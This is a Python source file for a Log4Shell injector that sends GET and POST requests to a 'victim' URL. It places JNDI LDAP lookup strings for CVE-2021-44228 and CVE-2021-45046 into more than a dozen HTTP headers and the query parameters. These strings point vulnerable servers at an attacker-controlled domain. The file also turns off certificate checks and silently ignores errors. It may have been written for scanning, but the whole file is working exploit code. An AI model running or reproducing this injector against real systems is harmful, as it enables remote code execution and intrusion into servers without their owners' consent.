import requests
import urllib3
from typing import Dict
import logging
logger = logging.getLogger()

urllib3.disable_warnings()


class Injector:
    FORMAT_JNDI = None

    def __init__(self, targeted_domain: str, proxies: Dict[str, str]):
        self._targeted_domain = targeted_domain
        self._proxies = proxies

    def send(self, victim_url: str, victim_identifier: str = None, request_method: str = None,
             header_params: Dict[str, str] = None, query_params: Dict[str, str] = None,
             timeout: int = 10):
        """
        Send a REST request to the victim URL address
        :param victim_url: The URL address to send the request to
        :param victim_identifier: Identifier to use for us to identify which victim answered us
        :param request_method: The type of REST request method to use. Default: uses GET and POST
        :param header_params: Header parameters to pass with the request
        :param query_params: Query parameters to pass with the request
        :param timeout: How long to wait in seconds for a response. Default: 10 seconds
        :return: None
        """
        if victim_identifier is not None:
            victim_identifier = requests.utils.requote_uri(victim_identifier) + '.'
        else:
            victim_identifier = ''
        evil_url = f'{victim_identifier}{self._targeted_domain}'
        jndi_url = self.FORMAT_JNDI.format(evil_url=evil_url)

        headers = {
            'User-Agent': jndi_url,
            'Referer': jndi_url,
            'CF-Connecting_IP': jndi_url,
            'True-Client-IP': jndi_url,
            'X-Forwarded-For': jndi_url,
            'Originating-IP': jndi_url,
            'X-Real-IP': jndi_url,
            'X-Client-IP': jndi_url,
            'Forwarded': jndi_url,
            'Client-IP': jndi_url,
            'Contact': jndi_url,
            'X-Wap-Profile': jndi_url,
            'X-Api-Version': jndi_url,
            'From': jndi_url
        }
        if header_params:
            headers.update(header_params)
        if request_method:
            methods = [request_method]
        else:
            methods = ['GET', 'POST']
        for method in methods:
            try:
                logger.info(f"Send request with {method} to URL: {victim_url} with {jndi_url}, header: {header_params}, "
                            f"params: {query_params}", extra={'region': ''})
                response = requests.request(method, victim_url,
                                            headers=headers,
                                            params=query_params,
                                            verify=False,
                                            proxies=self._proxies,
                                            timeout=timeout)
            except:
                pass



class CVE_2021_44228_Injector(Injector):
    FORMAT_JNDI = "${{jndi:ldap://{evil_url}/}}"



class CVE_2021_45046_Injector(Injector):
    FORMAT_JNDI = "${{jndi:ldap://127.0.0.1#{evil_url}/}}"



